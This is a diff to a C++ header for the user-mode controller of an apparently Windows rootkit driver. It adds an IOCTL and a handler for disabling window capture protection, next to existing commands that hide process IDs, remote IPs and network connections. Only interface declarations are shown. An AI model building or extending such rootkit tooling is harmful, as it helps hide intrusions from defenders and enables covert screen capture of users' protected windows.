@@ -33,7 +33,8 @@ namespace Driver
 		HideRemoteIP = CTL_CODE(RootkitDeviceType, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS),
 		HideConnectProcessId = CTL_CODE(RootkitDeviceType, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS),
 		HideConnectProcessName = CTL_CODE(RootkitDeviceType, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS),
-		HideProcessId = CTL_CODE(RootkitDeviceType, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
+		HideProcessId = CTL_CODE(RootkitDeviceType, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS),
+		DisableWindowCaptureProtect = CTL_CODE(RootkitDeviceType, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
 	};
 
 	class DriverHandler
@@ -51,6 +52,7 @@ namespace Driver
 		int CmdNetHideConnectPID(int argc, const char** argv);
 		int CmdNetHideConnectProcessName(int argc, const char** argv);
 		int CmdNetHidePID(int argc, const char** argv);
+		int CmdDisableWindowCaptureProtect(int argc, const char** argv);
 
 	private:
 		HANDLE device_handle_;
@@ -61,6 +63,7 @@ namespace Driver
 		BOOL hide_connect_pid(const char* message);
 		BOOL hide_connect_process(const char* message);
 		BOOL hide_pid(const char* message);
+		BOOL disable_window_capture_protect(const char* message);
 
 	};
 }
